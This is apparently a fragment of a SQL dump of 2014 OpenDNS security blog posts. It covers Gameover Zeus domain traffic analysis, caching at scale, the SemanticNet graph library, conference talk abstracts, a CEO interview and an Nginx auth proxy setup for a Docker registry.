This is something that is often put on the backburner for organizations that choose to primarily invest in prevention. Our startups, however, are able to build out their incident response more effectively because the number of incidents they’re generating in their environment is lower than your typical tightly-controlled Windows-based IT environments.\n4) Federated identity management for cloud app control is key\nIn an environment of expendable devices and no local data to protect, identity establishment and management continues to be hugely important in these startups’ IT organizations.\nCloud application identity (often referred to as IDaaS or “Identity as a Service”) vendors like Okta, OneLogin, and Symplified are offering better ways to perform all-important identity management for cloud applications. Increasingly, this is without the use of Active Directory as the backend Directory Service. That said, Microsoft and other big names like SalesForce, Amazon, and Google are attempting to close the gap and marginalize these new challengers.\nOur startups are demanding their vendors (security and otherwise) support SAML-based integrations so they can authorize users and log and control access through a single set of credentials — ideally, through a single, familiar user experience.\nThis approach delivers huge security benefits in that end-users no longer need to manage multiple passwords for their most-used cloud applications (the lists of seamlessly integrated cloud applications these IDaaS providers support is constantly growing). Also, administrators can shut out compromised accounts or terminated employees from accessing all of their cloud applications with a single mouse click.\n5) They focus on tightly integrating their data and services to get more out of their investments\nThe above example of demanding SAML is a good example of this, though it goes much farther than that for our startups. In the eyes of our startups, extracting threat intelligence out of some systems and injecting it into others is paramount for providing the sort of correlated event data that enables effective incident response.\nAs such, our startups are aggressively preferring vendors who are opening up their systems via canned integrations or APIs. They are demanding to get more out of their purchase than only what that vendor specializes in. At OpenDNS, we’re embracing this approach as we believe that our customers should control how best to leverage their investments and get the most out of the products they’ve purchased.\nSo what can I take away from these 5 observations?\nMany of us today aren’t in the enviable position to rapidly incorporate all of the progressive approaches these startups are taking around security. That said, I don’t think it’s a very big leap to say they are giving us a glimpse into what will eventually be the norm.\nYou may find yourself resisting on some or all of the above points in terms of your own IT/security strategy. If so, you may want to step back and be honest with yourself about how much your hand will be forced in the coming months and years.\nPractically, you might begin by considering some of the following suggestions:\nDevelop a realistic BYOD strategy. A simple Google search uncovers lots of advice on how to do this.\nFigure out the cost/benefit of your current Web security investments. Do this by trying out our TCO calculator.\nFocus your next IT hire around incident response. Make sure they have some programming skills so they can work with vendor APIs.\nAt OpenDNS, we’re continuing to learn from these startups as well as organizations like yours, who are in the process of transitioning from more traditional legacy IT environments to a world of clouds and mobility.\nIt’s a Herculean task and you’re the heroes, but with the right tools and a solid strategy it can be done.

This new variant relinquished the P2P feature and resorted to using CnCs hosted initially on a known fast flux proxy network [5][6] then subsequently on isolated IPs. This fast flux proxy network turns out to be multi-purpose and quite versatile and it was the subject of an extensive several months-long study that we covered first at BSides NOLA 2014 in May in our talk “Quest for Botnets using DNS” [7] and later in our talks at BlackHat [8] and DefCon [9][10] in August 2014.\nIn this blog post Anthony Kasza and I (Dhia Mahjoub) analyzed the traffic of oldGOZ and newGOZ domains in an effort to shed some light on the current status of infections. We will also provide some analysis about patterns in newGOZ domains registrations.\nIn the legal documents released in June by the DOJ following the takedown [11], 25662 oldGOZ DGA domains are cited in the Appendices. At the moment of this writing, 33% of these domains are nxdomains, and the remaining 66% are resolving to sinkholes or parking IPs. In the past month, we’ve observed about 5000+ of the cited domains having non-negligeable traffic. We also regularly observe traffic to a large number of oldGOZ domains not cited in the Appendices.\n\nTraffic patterns of Zeus GameOver domains\nFor any oldGOZ domain, we currently observe a traffic spike that lasts for 4 days before dying out (See Figure below).\n\nWhereas, for newGOZ domains we see a traffic spike of 24 hours for the domains of a particular day.\n\nThe co-occurences model can help us separately grab the clusters of oldGOZ or newGOZ domains of the day.\nWe were interested in checking the client IPs looking up oldGOZ and newGOZ domains for specific days and to see if there is any overlap. For that we considered a set of 2000+ oldGOZ domains that started having traffic on Sep 8th and lasted for 4 days (Sep 8,9,10,11) and 4 more sets of 1000 newGOZ domains each corresponding to Sep 8,9,10 and 11th.\n\nOver the period of four days, there were 1797 unique IPs querying oldGOZ domains and 961 IPs querying newGOZ domains. 47 IPs were common to these two sets which might indicate that these overlapping IPs are infected with the two GOZ variants or that they are public facing IPs (considering NAT) to systems running both variants.\n\nGeo distribution of GOZ client IPs\nIn the first map, we show the geographical distribution of client IPs querying oldGOZ during the 4 days period. We see a majority of infections still existing in Turkey, USA, India, Egypt and Indonesia.\n\nIn the second map, we show the geographical distribution of client IPs querying newGOZ during the 4 days period. We see a majority of lookups from Great Britain, USA and India.\n\nIn the third map, we show the 47 client IPs that looked both oldGOZ and newGOZ domains during Sep 8, 9, 10, 11th (total common IPs in the table above). We see a majority of infected machines located in USA and India (similar stats appeared in [4]).\n\n\n\nnewGOz domains registration\nA sample data set of newGOZ domains was collected from our query logs and Whois data ranging from August 20 through September 1.\n14 registrars were used to register 72 domains. The domains had a mean creation to query spike time of about -20 hours (meaning the domain was registered 20 hours before OpenDNS saw the first query spike for the domain name). Query spikes occur when query volumes for a domain grow exponentially within a short amount of time and then drop suddenly. The growth period is relative to the domain’s “life” within the DGA algorithm. Below is an example of the query spike seen for one such Gameover Zeus domain (xsz2ci17qx2793ylfyn8rrc1v[.]biz).\n\nAnalyzing creation time to query spike time deltas, we were able to identify a pattern in domain creation to query spike time which allowed us to accurately determine with high confidence if a domain was registered by security researchers or malicious actors. If a domain was registered more than one hour before the first query spike seen by OpenDNS, the registrant is likely not malicious. Domains registered the hour before the first query spike or the hour of the first query spike (just in time registration) correspond to real CnC.\nBelow is a time series showing the creation time to query spike time differences. Domains with creation date and first query time near or overlapping each other are just in time domain registrations.\n\nOf the 72 domains, 60 domains either were registered using privacy protection to hide the registrant contact’s email address or belonged to security researchers.\nThe 12 email addresses used to register the domains, which fell into neither of the previous categories, were inspected further.\nWhile one of the email addresses of the 12 registered two Gameover Zeus domains, three of the 12 email addresses registered one additional domain (with query volumes being extremely low). One of the domains ulticoms[.]net acted as a name server for Shylock domains and has since been taken down as shown in one of the Exhibits [12] accompanying the complaint filed by Microsoft against the Shylock botnet operators in July 2014 [13][14].\nFor the remaining two domains (gamesfather[.]net and barocoa[.]net), we are not sure if they are part of the Gameover Zeus campaign or not. The email addresses used to register these two domains could have been compromised accounts or could have been created strictly for registering GOZ domains. Either way, the two domains are highly suspect, and we will continue to monitor them in the hopes of confirming them as malicious or benign. If you have any additional information on the domains in question we’d love to hear from you.', 'Security Graph;Security Research', 'https://umbrella.cisco.com/blog/2014/09/18/zeus-gameover/');

INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1488, 'Caching at Scale', 'Philip Thomas', 'September 16, 2014', 'Yesterday a contingent from OpenDNS attended data-focused talks at the @Scale conference hosted by Facebook. Presentations focused on the issues that affect systems that process over 100,000 requests per second. While technologies like HDFS have provided a platform for solving most information storage and analysis problems, one pattern that emerged was the need for better tools to manage caching.\nHistory\nOpenDNS technology has its roots in distributed caching infrastructure – our DNS resolvers provide a read-only cache of the results of recursive lookups against authoritative DNS servers. DNS information is cached at 24 data centers worldwide. Due to the architecture of DNS, lookups come with a built-in expiry time in the form of a TTL. If there is ever a failure, anycast can provide automatic failover to other data centers. Consistency between sites is not required, but may be manually forced with our cache check utility.\nWhat interested our team from the @Scale conference was the applications of caching to dynamic data. Issues like consistency and failure detection become critical when read and write operations happen from the same client machines.\nDatabase Caches\nHistorically, caches were used to speed up systems so that not all client requests queried the database. However, at scale databases are unable to sustain all requests, thus making caches a critical part of infrastructure. Thus, the failure of a cache or the rebuilding of a cache can cause significant downtime.\nWhen running multiple memcached servers with direct client access, the failure of one cache server can cause cascading errors and downtime. Client connections are dropped, caches need to be rebuilt, and back-end databases may be affected. One remedy is counter-intuitive: decrease the number of caching servers, because more servers increases the likelihood of a failure.\nIn order to maintain pools of caching servers, companies have been working on different solutions to run critical caching infrastructure.\nBox – Tron\nTamar Bercovici from Box presented about storing structured data at scale and the issue of cache failure. Their solution is called Tron, which provides a proxy to memcached servers. The tool adds features such as automatic failure detection and consistency checks. However, Tron is client-dependent, so it is unlikely to be open-sourced in the near future.\nTwitter – TwemProxy\nWhile Twitter did not present about caching at the conference, their TwemProxy project was referenced in multiple presentations. TwemProxy is an open-source project by Twitter for better Memcache and Redis stability at scale. It works by proxying connections to cache servers in order to consolidate and thus decrease the number of open connections per machine. Since the system was open-sourced in early 2012, it has been adopted by companies including Pinterest, Snapchat, and Tumblr.\nFacebook – McRouter\nDuring their presentation, Facebook announced the open sourcing of their memcache tool McRouter. McRouter takes the basic ideas of TwemProxy and builds powerful routing tools on top that allow for the managing of production pools. McRouter features include failover between cache pools, multi-cluster consistency, and cold cache warm-up. In terms of memcache tools discussed at the conference, McRouter was one of the most advanced because it handles a variety of failure and scaling scenarios. The system is currently used in production at Facebook, and it is in the process of being adopted in other high-traffic environments such as Reddit.\nYoutube – Vitess / Vttable\nAfter Facebook presented a comprehensive tool for managing pools of caches, Sugu Sougoumarane from Google challenged the basic idea of dedicated caching pools. The basic idea of caches is to reduce database load and latency. Rather than separate caches and databases, Sugu embarked on a project to build caches into database systems. Vitess is a open-source system written in Go that is about to enter full production at Youtube. One of the most fascinating components is a MySQL wrapper called Vttablet.\nVttablet improves MySQL performance by modifying SQL, pooling connections, and consolidating queries. Vttablet supplements the MySQL buffer cache with RowCache, a memcache store of row information. Because the cache is also managed by Vttablet, there are no expiration keys – Vttablet invalidates caches when it parses SQL queries that change cached values, thus eliminating consistency issues.\nVitess challenges the paradigm of treating caching as a separate layer by directly addressing the issues of database scalability and by modifying the handling of SQL queries.\nConclusion\nWhen a cache grows from a single server to a pool, management and consistency become concerns. As request volumes grow, cache failures can take down a system. Because of this, the management of cache pools is becoming a critical component of data systems at scale.\nVideos from @Scale 2014 are available on Youtube.', 'Big Data;Scale;Security Engineering', 'https://umbrella.cisco.com/blog/2014/09/16/caching-scale/');

Because OpenGraphiti loads its graphs from a custom JSON representation of graphs, it is necessary to have a convenient way of generating the JSON graphs.\nThus, the purpose of SemanticNet is to provide a standard and easy mechanism to do this. The goal of this project is to make it easy to let the user focus on the semantics, rather than the mechanics, of their graph, while providing a way to do more complex graph operations for those who need it.\nThat is, this is not Yet Another Graph Library, but rather a simplified interface for the creation of semantic graphs in JSON.\n\nDescription\nSemanticNet is a Python module to assist in the creation of semantic graphs in a JSON format. Underlying SemanticNet is the networkx graph library, which can be accessed and used for more complex graph operations.\n\nJSON representation\nThe graphs used by OpenGraphiti are represented as one might expect. Suppose you have a graph G = (V, E), where\nV = {0, 1, 2} and\nE = {(0, 1), (0, 2), (1, 2)}\nSuppose further that:\n\nVertex 0 has the attributes: {\"type\": \"A\", \"id\": 0}\nVertex 1 has the attributes: {\"type\": \"B\", \"id\": 1}\nVertex 2 has the attributes: {\"type\": \"C\", \"id\": 2}\nEdge (0, 1) has the attributes: {\'src\': 0, \'dst\': 1, \'type\': \'normal\', \'id\': 0}\nEdge (0, 2) has the attributes: {\'src\': 0, \'dst\': 2, \'type\': \'normal\', \'id\': 1}\nEdge (1, 2) has the attributes: {\'src\': 1, \'dst\': 2, \'type\': \'irregular\', \'id\': 1}\n\nthen in JSON format, it would look like:\n\n{\n \"timeline\": [],\n \"nodes\": [\n  {\n   \"type\": \"A\",\n   \"id\": 0\n  },\n  {\n   \"type\": \"B\",\n   \"id\": 1\n  },\n  {\n   \"type\": \"C\",\n   \"id\": 2\n  }\n ],\n \"meta\": {},\n \"edges\": [\n  {\n   \"src\": 0,\n   \"dst\": 1,\n   \"type\": \"normal\",\n   \"id\": 0\n  },\n  {\n   \"src\": 0,\n   \"dst\": 2,\n   \"type\": \"normal\",\n   \"id\": 1\n  },\n  {\n   \"src\": 1,\n   \"dst\": 2,\n   \"type\": \"irregular\",\n   \"id\": 2\n  }\n ]\n}\n\n\nAs you can see, there is a list of \"node\" objects, each of which contain the node’s attributes and IDs, as well as a list of \"edge\" objects, each of which have the edge’s attributes, and the fields \"src\" and \"dst\", which indicate the source and destination vertices, respectively.\nNode IDs\nAs previously stated, the goal of the project is to let the user focus on the semantics of their graph. As such, rather than forcing the user to specify each new node’s ID, the default behavior is to assign each new node with a randomly-generated UUID. So to generate the graph in the above section, one would do something like this:\n\n>>> g = sn.Graph()\n>>> a = g.add_node({\'type\': \'A\'})\n>>> b = g.add_node({\'type\': \'B\'})\n>>> c = g.add_node({\'type\': \'C\'})\n>>> c\nUUID(\'a7faaba8-ec65-44d5-a911-86f3a087eeab\')\n>>> g.add_edge(a, b, {\'type\': \'normal\'})\nUUID(\'ad173385-4c76-474d-a75d-c861d5d72d9d\')\n>>> g.add_edge(a, c, {\'type\': \'normal\'})\nUUID(\'08833cd0-0d83-4e46-a3a1-3ac52e50c73e\')\n>>> g.add_edge(b, c, {\'type\': \'irregular\'})\nUUID(\'91518542-ea4a-4103-8b4c-a2f106c5aea5\')\n>>> g.save_json(\'output.json\')\n\n\nthe contents of output.json would be similar to this, with different IDs:\n\n{\n \"timeline\": [],\n \"nodes\": [\n  {\n   \"type\": \"B\",\n   \"id\": \"b7d3fbe83672412cadd6f0249455fb43\"\n  },\n  {\n   \"type\": \"C\",\n   \"id\": \"a7faaba8ec6544d5a91186f3a087eeab\"\n  },\n  {\n   \"type\": \"A\",\n   \"id\": \"8bec5b56d76c4282b3baa80454a9dee8\"\n  }\n ],\n \"meta\": {},\n \"edges\": [\n  {\n   \"src\": \"b7d3fbe83672412cadd6f0249455fb43\",\n   \"dst\": \"a7faaba8ec6544d5a91186f3a087eeab\",\n   \"type\": \"irregular\",\n   \"id\": \"91518542ea4a41038b4ca2f106c5aea5\"\n  },\n  {\n   \"src\": \"b7d3fbe83672412cadd6f0249455fb43\",\n   \"dst\": \"8bec5b56d76c4282b3baa80454a9dee8\",\n   \"type\": \"normal\",\n   \"id\": \"ad1733854c76474da75dc861d5d72d9d\"\n  },\n  {\n   \"src\": \"a7faaba8ec6544d5a91186f3a087eeab\",\n   \"dst\": \"8bec5b56d76c4282b3baa80454a9dee8\",\n   \"type\": \"normal\",\n   \"id\": \"08833cd00d834e46a3a13ac52e50c73e\"\n  }\n ]\n}\n\n\nHowever, sometimes it is advantageous to use non-random IDs. As such, because the underlying graph is a networkx graph, the ID can be any hashable type. The ID of a new node or edge can be specified by supplying the optional id_ argument.\n\n>>> a = g.add_node({\'type\': \'A\'}, \'a\')\n>>> a\n\'a\'\n\n\nQuick Example: File system\nHere is a quick demonstration of how to generate a rooted tree from a directory of your filesystem:\n\n#!/usr/bin/env python\n\nimport sys\nimport os\nimport argparse\nimport semanticnet as sn\n\ndef add_node(graph, root, label, node_type):\n    data = {}\n\n    if os.path.islink(root):\n        data[\'type\'] = \'link\'\n\n    path = os.path.join(root, label)\n\n    if not graph.has_node(path):\n        graph.add_node({\"type\": node_type, \"label\": label}, path)\n\n    graph.add_edge(root, path, data)\n\nif __name__ == \"__main__\":\n    if len(sys.argv) < 1:\n        print(\"Need a starting dir\")\n        sys.exit(-1)\n\n    start = sys.argv[1]\n    graph = sn.Graph()\n\n    for root, dirs, files in os.walk(start, followlinks=True):\n        print(root)\n\n        if not graph.has_node(root):\n            graph.add_node({\'label\': root, \'type\': \'dir\', \'depth\': 0}, root)\n\n        for d in dirs:\n            add_node(graph, root, d, \"dir\")\n        for f in files:\n            add_node(graph, root, f, os.path.splitext(f)[1])\n\n    graph.save_json(\"fs.json\")\n\n\nHere, we make use of Python’s built-in os.walk() method to traverse the given path. We add directories with the type attribute set to “dir”, and files set to their file extension. This way, OpenGraphiti will be able to color the nodes and edges by type (directory, symbolic link, type of file, etc.).\nThis example is included in the examples folder of the source code, with several other examples, all of which are documented in the README.\nCaching\nShould you come across a use case where you’d like quick references to nodes or edges by more than just the ID, semanticnet provides a mechanism to cache nodes and edges by any of their attributes. For example, suppose you make the following graph:\n\n>>> g = sn.Graph()\n>>> a = g.add_node({\"type\": \"server\"}, \'3caaa8c09148493dbdf02c574b95526c\')\n>>> b = g.add_node({\"type\": \"server\"}, \'2cdfebf3bf9547f19f0412ccdfbe03b7\')\n>>> c = g.add_node({\"type\": \"client\"}, \'3cd197c2cf5e42dc9ccd0c2adcaf4bc2\')\n>>> g.add_edge(a, b, {\"method\": \"GET\", \"port\": 80}, \'5f5f44ec7c0144e29c5b7d513f92d9ab\')\nUUID(\'5f5f44ec-7c01-44e2-9c5b-7d513f92d9ab\')\n>>> g.add_edge(a, c, {\"method\": \"GET\", \"port\": 80}, \'7eb91be54d3746b89a61a282bcc207bb\')\nUUID(\'7eb91be5-4d37-46b8-9a61-a282bcc207bb\')\n>>> g.add_edge(b, c, {\"method\": \"POST\", \"port\": 443}, \'c172a3599b7d4ef3bbb688277276b763\')\nUUID(\'c172a359-9b7d-4ef3-bbb6-88277276b763\')\n\n\nSuppose further that you want to access the nodes by their \"type\" attribute. You can tell semanticnet to cache the nodes by the \"type\" attribute, and access them like so:\n\n>>> g.cache_nodes_by(\"type\")\n>>> g.get_nodes_by_attr(\"type\")\n{\'client\': [{\'type\': \'client\', \'id\': UUID(\'3cd197c2-cf5e-42dc-9ccd-0c2adcaf4bc2\')}], \'server\': [{\'type\': \'server\', \'id\': UUID(\'2cdfebf3-bf95-47f1-9f04-12ccdfbe03b7\')}, {\'type\': \'server\', \'id\': UUID(\'3caaa8c0-9148-493d-bdf0-2c574b95526c\')}]}\n\n\nSimilarly, you could get a list of all connections by port:\n\n>>> g.cache_edges_by(\"port\")\n>>> g.get_edges_by_attr(\"port\")\n{80: [{\'port\': 80, \'src\': UUID(\'3caaa8c0-9148-493d-bdf0-2c574b95526c\'), \'dst\': UUID(\'3cd197c2-cf5e-42dc-9ccd-0c2adcaf4bc2\'), \'id\': UUID(\'7eb91be5-4d37-46b8-9a61-a282bcc207bb\'), \'method\': \'GET\'}, {\'port\': 80, \'src\': UUID(\'3caaa8c0-9148-493d-bdf0-2c574b95526c\'), \'dst\': UUID(\'2cdfebf3-bf95-47f1-9f04-12ccdfbe03b7\'), \'id\': UUID(\'5f5f44ec-7c01-44e2-9c5b-7d513f92d9ab\'), \'method\': \'GET\'}], 443: [{\'port\': 443, \'src\': UUID(\'2cdfebf3-bf95-47f1-9f04-12ccdfbe03b7\'), \'dst\': UUID(\'3cd197c2-cf5e-42dc-9ccd-0c2adcaf4bc2\'), \'id\': UUID(\'c172a359-9b7d-4ef3-bbb6-88277276b763\'), \'method\': \'POST\'}]}\n\n\nand you can specify the attribute value as well, to return the list of connections by, say, port 80:\n\n>>> g.get_edges_by_attr(\"port\", 80)\n[{\'port\': 80, \'src\': UUID(\'3caaa8c0-9148-493d-bdf0-2c574b95526c\'), \'dst\': UUID(\'3cd197c2-cf5e-42dc-9ccd-0c2adcaf4bc2\'), \'id\': UUID(\'7eb91be5-4d37-46b8-9a61-a282bcc207bb\'), \'method\': \'GET\'}, {\'port\': 80, \'src\': UUID(\'3caaa8c0-9148-493d-bdf0-2c574b95526c\'), \'dst\': UUID(\'2cdfebf3-bf95-47f1-9f04-12ccdfbe03b7\'), \'id\': UUID(\'5f5f44ec-7c01-44e2-9c5b-7d513f92d9ab\'), \'method\': \'GET\'}]\n\n\nThe cache is managed automatically. Any time you add or remove a node/edge with an attribute that you are caching, or modify an attribute of a node/edge, semanticnet updates the cache.\nClosing Remarks\nIt is our hope that through the use of OpenGraphiti and SemanticNet, users will be able to easily visualize any semantic network they can think of. Both projects are open source, and their source code can be found on GitHub.\nThe SemanticNet package is available now.\n// <![CDATA[\nfunction scrollToHash() {       if (location.hash &#038;&#038; !document.querySelector(\":target\")) {         var elements = document.getElementsByName(\'user-content-\' + location.hash.slice(1));         if (elements.length > 0) {\n          elements[elements.length - 1].scrollIntoView();\n        }\n      }\n    }\n    window.onhashchange = function() {\n      scrollToHash();\n    }\n    window.onload = function() {\n      scrollToHash();\n    }\n// ]]&gt;', 'Open Source;Security Research', 'https://umbrella.cisco.com/blog/2014/09/04/semanticnet-python-library-opengraphiti/');

S4 is a free one-day conference for in-the-trenches Incident Responders and Security Researchers. The conference includes training on some of the most useful open source tools and services presented by some of the top experts in the industry, followed by talks in the evening and networking at night.\nS4 Incident Responder and Researcher Conference Details\nWho: Incident Responders, Security Researchers, Security Analysts\nWhat: S4 (San Francisco Security Series): Incident Responder and Researcher Conference\nWhen: September 18, 2014 (registration starts at 8:30 AM.

For each adversary you should be able to pinpoint targets. Model the primary channels of access and then look for sideways access. Examples of sideways access include things like shipping or order fulfillment systems that check credit card approval status. Oh yeah that system! Once again your #DFIR team can be a great addition to the gaining of evidence (not probative but still important).\nAt some companies they maintain a threat briefing for general counsel and their board of directors. At an unnamed company I looked their very technically astute report on current threats to the enterprise. I asked them what was the cause of their three biggest unexpected outages. In two cases it was weather. Yet their report didn’t even mention weather going out to any level of planning. A focus on the bits and bytes misses lighting and floods.\nModeling adversary access attempts to the organization takes some skill. You will never do this perfectly. It is difficult to get people to understand that an adversary does not have to work within your rules, procedures, or capabilities. That freedom allows them to analyze and evaluate how to work outside our organizational structure and use enterprise risk to their advantage. This kind of analysis does not come in a threat feed. It is not a list of IPs and most assuredly it isn’t something you should be sending outside of your organization.\nMeasuring the IQ of your Threat Intelligence Feeds – by Alex Pinto, MLSec Project\n\nAbstract: Threat Intelligence feeds are now being touted as the saving grace for SIEM and log management deployments, and as a way to supercharge incident detection and even response practices. We have heard similar promises before as an industry, so it is only fair to try to investigate. Since the actual number of breaches and attacks worldwide is unknown, it is impossible to measure how good threat intelligence feeds really are, right? Enter a new scientific breakthrough developed over the last 300 years: statistics!\nThis presentation will consist of a data-driven analysis of a cross-section of threat intelligence feeds (both open-source and commercial) to measure their statistical bias, overlap, and representability of the unknown population of breaches worldwide. Are they a statistical good measure of the population of “”bad stuff”” happening out there? Is there even such a thing? How tuned to your specific threat surface are those feeds anyway? Regardless, can we actually make good use of them even if the threats they describe have no overlap with the actual incidents you have been seeing in your environment?\nWe will provide an open-source tool for attendees to extract, normalize and export data from threat intelligence feeds to use in their internal projects and systems. It will be pre-configured with current OSINT network feed and easily extensible for private or commercial feeds. All the statistical code written and research data used (from the open-source feeds) will be made available in the spirit of reproducible research. The tool itself will be able to be used by attendees to perform the same type of tests on their own data.\nJoin Alex on a journey through the actual real-world usability of threat intelligence to find out which mix of open source and private feeds are right for your organization.\nBuilding Your Own DFIR Sidekick – by Scott J Roberts, GitHub\n\nAbstract: Even though Decepticons, Cylons, and Johnny 5 may eventually control the world with humanity destroyed or as their pets but we can still get a lot of use out of them until then. Hubot is an open source multi-service chat bot built for finding cat pictures and deploying servers as a part of GitHub’s ChatOps workflow.\nChatOps is meant to enable rapid response, automation, collaboration, and use of cutting edge techniques in operations, but can also help with incident response, reverse engineering, OSINT, and other computer network defense tasks. For this we created Hubot Variable Threat Response. Hubot VTR to let us automate & collaborate on security operations. You’ll learn how to use Hubot for devops and security, how to build your own commands with CoffeeScript or Python, and basically how to build your own personal robot for fighting bad guys.\nAnd finding cat pictures. Man is he good at cat pictures.\nFastResponder: New Open Source weapon to detect and understand a large scale compromise – by Sébastien Larinier, Guillaume Arcas, and Olivier Zheng, Sekoia\n\nAbstract: With the huge size of new hard drives, memories and cloud computing, it is now impossible to make traditional forensic computer by computer to collect evidences and design a compromission plan. With APT and large attacks like EK, many computers are infected during a campaign. We decided to develop a collector which dumps just enough information to be able to detect signs of compromission and identify the infected computers on all kind of networks.\nWe started from the SANS institute poster of the FOR 408 “Windows forensic” which details the the main artifacts needed to be collected and we also added some more that we found relevant in the use cases of #FastForensic.\nFastResponder has been developed in Python and is composed of multiple modules. A collection profile has been configured using CLI or a configuration file is used to enable the acquisition of a chosen module only, which enable to use fewer memory and time. A specific artifact can also be collected to search for a specific attack using your own threat intelligence with yara rules or specific md5 file. All evidences are recorded in UTF-8 CSV files. The files can be processed in logstash/Kibana/ElasticSearch or Splunk to make supertimeline and define query to quickly find out if computers are infected or compromised.\nPlease reserve soon as space is limited.

In advance of BoxWorks, the blog team at OpenDNS sat down with David to get his perspective on how the cloud can make us more secure and why he decided to start a security company.\nYou’ve been in the security game for a long time. How did you first become involved in security?\nDU: Basically, I fell into security out of a need to protect my company.\nIn 2001 I founded my first company, EveryDNS. We would eventually provide authoritative DNS services for over 135,000 domains, but in the beginning we just wanted to provide the best and fastest experience possible.\nAfter launching, we discovered that there were two security challenges that we needed to address. The first challenge was that we were being targeted by phishers, spammers and found ourselves on the receiving end of what was (up to that point) the largest DDoS attack in history. The other problem was that we were providing a reliable, fast service that was free — so bad guys started using our service as part of their infrastructure.\nWe had to become very good at dealing with abuse, proactively getting rid of the bad guys and responding to malicious activity. In a short period of time, we went from hosting bad guys to finding them and removing them quickly. We went from being under attack to blocking bad guys at the edge of our network.\nThat led to the creation of OpenDNS.\nWhat do you think is the biggest challenge facing CISOs today?\nDU: The biggest challenge for CISOs, by far, is getting more visibility into their IT infrastructure so they can understand the scope of their security problems. It makes sense that this would be an area of focus for them, as more visibility gives them a better sense of their risk exposure, security posture and helps them know what their priorities should be.\nVisibility has become a problem as people have changed the way that they work. You get less visibility as people move out of the office and start using more cloud services. Shadow IT in general is a huge source of blind spots. IT infrastructure that the IT group doesn’t know about is a huge blind spot and one area that lots of the CISOs that I talk to would like to improve.\nThat’s probably the reason why there have been dozens of cloud visibility services that have sprung up in the last few years — there is a huge need for more visibility into the Shadow IT problem.\nHow do you improve visibility into Shadow IT?\nDU: Companies often have multiple, siloed data sources that can be combined to address the visibility problems I just mentioned.\nFor instance, take a company that is running FireEye. You could be using FireEye to protect yourself from some threats, but if you’re not connecting FireEye and Splunk, you’re not harnessing that data to make your security smarter. You could have one part of your infrastructure that is under attack and another part that will be under attack. If you can’t use the data from every attack to make yourself more secure, you’re missing an opportunity. We know that attackers are constantly trying to perform reconnaissance to gather more intelligence on their targets. Enterprises need to be doing the same thing for their own security.\nAnother area where you can improve your visibility is through intelligence sharing. Customers are finally beginning to share threat intelligence with each other. Companies in financial services industry, for example, are now realizing that if one of them gets attacked, they all might be attacked by the same group. A year ago, no one in security would have been able to guess how quickly enterprises would be sharing threat intelligence with each other. Two years ago, no one would do this kind of community intelligence sharing. Now, it’s all for one and one for all.\nWhat’s the advantage to running security through a cloud-delivered DNS service?\nDU: DNS is the first point of contact for most of the traffic on the Internet.\nAlthough people would agree that DNS is a fundamental part of the way the Internet works, they may have never considered how that translates into a security advantage.\nTo illustrate how DNS offers a security advantage, look at something like Lockheed’s Cyber Kill Chain. The basic premise of the kill chain model is that attackers have gotten so good at finding innovative ways of breaking into networks. So we need to build a structured feedback loop to help our networks improve their defenses and recover from attacks more quickly.\nOne of the key takeaways for most enterprises from work on the Cyber Kill Chain is that it’s progressively less expensive to block a threat earlier in the chain. That means early prevention is the cheapest option, and reacting to an attack afterwards is the most expensive one.\nWe focus on two parts of the kill chain: early prevention and preventing the exfiltration of data.\nSince DNS is the first point of contact for most of the Internet, it can block more attacks at the first point in the kill chain. DNS is port and protocol agnostic, so it can see and block more traffic from more of the Internet regardless of the vector.\nWhere most proxies only try to protect against incoming threats, we can also detect malware and botnets that are trying to beacon out to a command and control server. We can also detect outbound connections that are attempting to connect to a hacker’s own infrastructure and may be an attempt to exfiltrate data.\nAlso, DNS is important for the entire Internet, not just the Web. The Internet is more than just the Web, by the way, especially when it comes to malware.', 'Events', 'https://umbrella.cisco.com/blog/2014/09/03/boxworks-preview-q-opendns-ceo-david-ulevitch/');

We lock our doors, protect our banking information with passwords that are usually so complicated that we tend to forget them. Using common sense to secure systems is just good practice. It’s really easy to assume that because a system is internal, there is no need to enable authentication or a secure transport for it, but in our current era of remote workers, that internal network can be quite wide.\nWith that in mind, we spent some time investigating various systems we’re bringing up and this week, we set out with the goal of adding authentication to our private Docker repository. As you may be aware, the Docker registry does not provide a mechanism for authentication so we decided that the easiest solution to this problem would be to add an authentication proxy in front of our image repository. In our case we decided to use Nginx over SSL coupled with an internal authentication API:\n\n\nThis solution provided us with a few advantages:\nallows us to use our internal authentication API\ncan be re-used to provide authentication to other systems\ncan be implemented using a Docker container (we <3 Docker)\nWe put together a simple authentication service and an Nginx container which we made available here (https://registry.hub.docker.com/u/opendns/).\nSimple basic authentication service\nAs a reference for the Nginx proxy container, we built an authentication API using NodeJS, which made creating a Basic authentication service a breeze. All we need to do is to create a really simple server.js, generate a credentials file using the htpasswd utility and wrap the whole thing in a Docker container which we created with the following Dockerfile:\nFROM google/nodejs\nADD . /app\nWORKDIR /app\nRUN npm install http-auth\nEXPOSE 8000\nENV NODE_PATH /data/node_modules/\nCMD [\"node\", \"server.js\"]\nWe then deployed and tested our service:\nubuntu@trusty-64:/basic-auth# docker build -t opendns/basic-auth-service .\nubuntu@trusty-64:/basic-auth# docker run --name simple-auth opendns/basic-auth-service\nubuntu@trusty-64:/basic-auth# docker inspect --format \'{{ .NetworkSettings.IPAddress }}\' simple-auth\n172.17.0.40\nubuntu@trusty-64:/basic-auth# curl 172.17.0.40:8000\n401 Unauthorized\nubuntu@trusty-64:/basic-auth# curl -u testuser:testpassword 172.17.0.40:8000\nUser authenticated successfully\nYou can find the full example code for the basic authentication service here and the container available here.\nNginx authentication proxy\nThe key component of the Nginx proxy is the configuration:\n# define an /auth section to send the request to an authentication service\nlocation = /auth {\nproxy_pass {{auth_backend}};\nproxy_pass_request_body off;\nproxy_set_header Content-Length \"\";\nproxy_set_header X-Original-URI $request_uri;\nproxy_set_header X-Docker-Token \"\";\n}\n\n# use the auth_request directive to redirect all requests to the /auth section above\nlocation / {\nproxy_pass {{backend}};\nauth_request /auth;\nproxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504;\nproxy_buffering off;\n}\nIt uses the http_auth_request module which sends the user using the proxy_pass directive to our simple authentication service which either returns a 200 or a 401. The 401 Authorization response triggers the Docker client to respond with a set of credentials using basic auth. Once the credentials are accepted and the API returns a 200, nginx can send the request through to the private registry. Putting the two containers together:\nubuntu@trusty-64:/nginx-auth-proxy# docker run -d --name hello-world hello-world # run a simple web server that prints out “Hello world”\nubuntu@trusty-64:/nginx-auth-proxy# docker inspect --format \'{{ .NetworkSettings.IPAddress }}\' 